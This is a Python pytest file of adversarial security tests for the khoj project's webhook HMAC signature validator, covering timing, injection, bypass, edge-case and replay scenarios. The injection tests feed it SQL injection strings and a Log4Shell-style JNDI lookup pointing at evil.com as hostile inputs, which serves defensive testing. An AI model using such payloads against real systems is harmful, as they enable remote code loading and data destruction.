"""
Adversarial tests for webhook signature validation.
Focus on attack vectors: timing attacks, injection, bypass attempts.

These tests verify the security of validate_webhook_signature function
from khoj.routers.helpers.

To run these tests:
1. With pytest (requires database): pytest tests/test_webhook_adversarial.py -v
2. Standalone: python tests/test_webhook_adversarial.py
"""
import hashlib
import hmac
import sys
import time
import os

# Add src to path for Django imports
# Test is at tests/test_webhook_adversarial.py, need to go up to repo root
_test_file = os.path.abspath(__file__)
_repo_root = os.path.dirname(os.path.dirname(_test_file))  # Go up from tests/ to repo root
_src_path = os.path.join(_repo_root, 'src')
if _src_path not in sys.path:
    sys.path.insert(0, _src_path)

import pytest


def get_validate_webhook_signature():
    """Import the function dynamically to avoid Django setup issues."""
    # Only import Django settings if not already configured
    try:
        import django
        from django.conf import settings
        if not settings.configured:
            import os
            os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'khoj.app.settings')
            django.setup()
    except Exception:
        pass
    
    from khoj.routers.helpers import validate_webhook_signature
    return validate_webhook_signature


class TestWebhookTimingAttacks:
    """Test for timing attack vulnerabilities."""

    def test_constant_time_comparison_different_lengths(self):
        """Verify timing doesn't leak via signature length differences."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret_key"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        # Test with various length signatures - all should be rejected
        test_sigs = [
            "",                  # 0 chars
            "a",                 # 1 char  
            "a" * 32,            # 32 chars - half
            "a" * 63,            # 63 chars - one less
            "a" * 128,          # 128 chars - double
        ]
        
        for sig in test_sigs:
            result = validate(payload, sig, secret)
            assert result is False, f"Signature of length {len(sig)} should be rejected"

    def test_timing_consistency(self):
        """Run multiple iterations to detect timing variance patterns."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test", "data": {"id": 123}}'
        secret = "test_secret_key"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        valid_times = []
        invalid_times = []
        
        for _ in range(50):
            start = time.perf_counter()
            validate(payload, valid_sig, secret)
            valid_times.append(time.perf_counter() - start)
            
            start = time.perf_counter()
            validate(payload, "a" * 64, secret)
            invalid_times.append(time.perf_counter() - start)
        
        avg_valid = sum(valid_times) / len(valid_times)
        avg_invalid = sum(invalid_times) / len(invalid_times)
        
        # If difference is more than 10x, there's a timing leak
        # But with hmac.compare_digest, this should be constant
        assert abs(avg_valid - avg_invalid) < avg_valid * 10 or abs(avg_valid - avg_invalid) < 0.0001


class TestWebhookInjectionAttacks:
    """Test for injection attack vulnerabilities."""

    def test_signature_injection_attempts(self):
        """Attempt injection via signature parameter."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        
        injection_sigs = [
            "'; DROP TABLE users; --",
            "0' OR '1'='1",
            "${jndi:ldap://evil.com/a}",
            "a" * 10000,  # Buffer overflow attempt
        ]
        
        for sig in injection_sigs:
            try:
                result = validate(payload, sig, secret)
                assert result is False
            except Exception as e:
                pytest.fail(f"Injection possible: {type(e).__name__}: {e}")

    def test_secret_injection_attempts(self):
        """Attempt injection via secret parameter."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        signature = "a" * 64
        
        injection_secrets = [
            "'; DROP TABLE users; --",
            "0' OR '1'='1",
            "${jndi:ldap://evil.com/a}",
            "a" * 10000,
        ]
        
        for sec in injection_secrets:
            try:
                result = validate(payload, signature, sec)
                assert result is False
            except Exception as e:
                pytest.fail(f"Injection possible: {type(e).__name__}: {e}")


class TestWebhookBypassAttempts:
    """Test for validation bypass techniques."""

    def test_empty_and_none_values(self):
        """Test edge cases with None/empty values."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        
        test_cases = [
            (None, None, False),
            (None, "", False),
            ("", None, False),
            ("", "", False),
            ("sig", None, False),
            ("sig", "", False),
        ]
        
        for sig, sec, expected in test_cases:
            result = validate(payload, sig, sec)
            assert result is expected, f"Failed for signature={repr(sig)}, secret={repr(sec)}"

    def test_type_confusion_attempts(self):
        """Test with wrong types to bypass validation."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        # Type confusion attempts - should handle gracefully
        try:
            validate(payload, valid_sig.encode(), secret)  # bytes signature
        except (TypeError, AttributeError):
            pass  # Acceptable

    def test_case_sensitivity_bypass(self):
        """Test case manipulation to bypass validation."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        # Test with uppercase signature (hexdigest returns lowercase)
        upper_sig = valid_sig.upper()
        assert upper_sig != valid_sig, "upper should be different from lowercase hex"
        r1 = validate(payload, upper_sig, secret)
        assert r1 is False, f"upper case should fail: {r1}"
        
        # Title case is different from lowercase too
        title_sig = valid_sig.title()
        r3 = validate(payload, title_sig, secret)
        assert r3 is False, f"title case should fail: {r3}"

    def test_algorithm_confusion(self):
        """Test using wrong hashing algorithms."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        
        sha1_sig = hmac.new(secret.encode(), payload, hashlib.sha1).hexdigest()
        sha512_sig = hmac.new(secret.encode(), payload, hashlib.sha512).hexdigest()
        md5_sig = hmac.new(secret.encode(), payload, hashlib.md5).hexdigest()
        
        assert validate(payload, sha1_sig, secret) is False
        assert validate(payload, sha512_sig, secret) is False
        assert validate(payload, md5_sig, secret) is False

    def test_partial_signature_matching(self):
        """Test partial signature matching bypass."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        for i in range(1, 64):
            partial = valid_sig[:i]
            assert validate(payload, partial, secret) is False

    def test_whitespace_manipulation(self):
        """Test whitespace manipulation bypass."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        secret = "test_secret"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        assert validate(payload, " " + valid_sig, secret) is False
        assert validate(payload, valid_sig + " ", secret) is False
        assert validate(payload, "\t" + valid_sig, secret) is False


class TestWebhookEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_very_long_inputs(self):
        """Test with extremely long inputs."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test", "data": "' + b'x' * 100000 + b'"}'
        secret = "test_secret"
        
        valid_sig = hmac.new(secret.encode(), payload, hashlib.sha256).hexdigest()
        
        result = validate(payload, valid_sig, secret)
        assert result is True
        
        long_secret = "secret" + "x" * 100000
        valid_sig_long = hmac.new(long_secret.encode(), payload, hashlib.sha256).hexdigest()
        
        result = validate(payload, valid_sig_long, long_secret)
        assert result is True

    def test_special_characters_in_secret(self):
        """Test with special characters in secret."""
        validate = get_validate_webhook_signature()
        
        payload = b'{"event": "test"}'
        
        special_secrets = [
            "secret!@#$%^&*()",
            "secret<>?:/\\|",
            "secret[]{}~`",
            "secret with spaces",
            "secret\twith\ttabs",
        ]
        
        for sec in special_secrets:
            sig = hmac.new(sec.encode(), payload, hashlib.sha256).hexdigest()
            result = validate(payload, sig, sec)
            assert result is True, f"Failed for secret: {sec}"
            
            assert validate(payload, sig, sec + "wrong") is False

    def test_special_characters_in_payload(self):
        """Test with special characters in payload."""
        validate = get_validate_webhook_signature()
        
        secret = "test_secret"
        
        special_payloads = [
            b'{"event": "test", "msg": "hello world"}',
            b'{"event": "test", "msg": "hello\\nworld"}',
            b'{"event": "test"}\n\r\n{"another": "payload"}',
        ]
        
        for pl in special_payloads:
            sig = hmac.new(secret.encode(), pl, hashlib.sha256).hexdigest()
            result = validate(pl, sig, secret)
            assert result is True, f"Failed for payload: {pl}"

    def test_empty_payload(self):
        """Test with empty payload."""
        validate = get_validate_webhook_signature()
        
        secret = "test_secret"
        
        sig = hmac.new(secret.encode(), b"", hashlib.sha256).hexdigest()
        result = validate(b"", sig, secret)
        assert result is True
        
        assert validate(b"", "a" * 64, secret) is False


class TestWebhookReplayAttacks:
    """Test for replay attack scenarios."""

    def test_same_signature_rejected_different_context(self):
        """Verify signatures are payload-dependent."""
        validate = get_validate_webhook_signature()
        
        secret = "test_secret"
        
        sig1 = hmac.new(secret.encode(), b'{"event": "test1"}', hashlib.sha256).hexdigest()
        sig2 = hmac.new(secret.encode(), b'{"event": "test2"}', hashlib.sha256).hexdigest()
        
        assert validate(b'{"event": "test1"}', sig1, secret) is True
        assert validate(b'{"event": "test1"}', sig2, secret) is False
        assert validate(b'{"event": "test2"}', sig1, secret) is False
        assert validate(b'{"event": "test2"}', sig2, secret) is True


if __name__ == "__main__":
    # Run all tests manually
    import os
    import sys
    
    # Add src to path for Django imports
    src_path = os.path.join(os.path.dirname(__file__), 'src')
    sys.path.insert(0, src_path)
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'khoj.app.settings')
    
    print("Running adversarial tests for webhook signature validation...")
    print("=" * 60)
    
    test_classes = [
        TestWebhookTimingAttacks,
        TestWebhookInjectionAttacks,
        TestWebhookBypassAttempts,
        TestWebhookEdgeCases,
        TestWebhookReplayAttacks,
    ]
    
    passed = 0
    failed = 0
    
    for test_class in test_classes:
        print(f"\n{test_class.__name__}:")
        instance = test_class()
        for method_name in dir(instance):
            if method_name.startswith("test_"):
                try:
                    getattr(instance, method_name)()
                    print(f"  [PASS] {method_name}")
                    passed += 1
                except Exception as e:
                    print(f"  [FAIL] {method_name}: {e}")
                    failed += 1
    
    print("\n" + "=" * 60)
    print(f"Results: {passed} passed, {failed} failed")
    
    if failed > 0:
        sys.exit(1)
    else:
        print("ALL TESTS PASSED!")
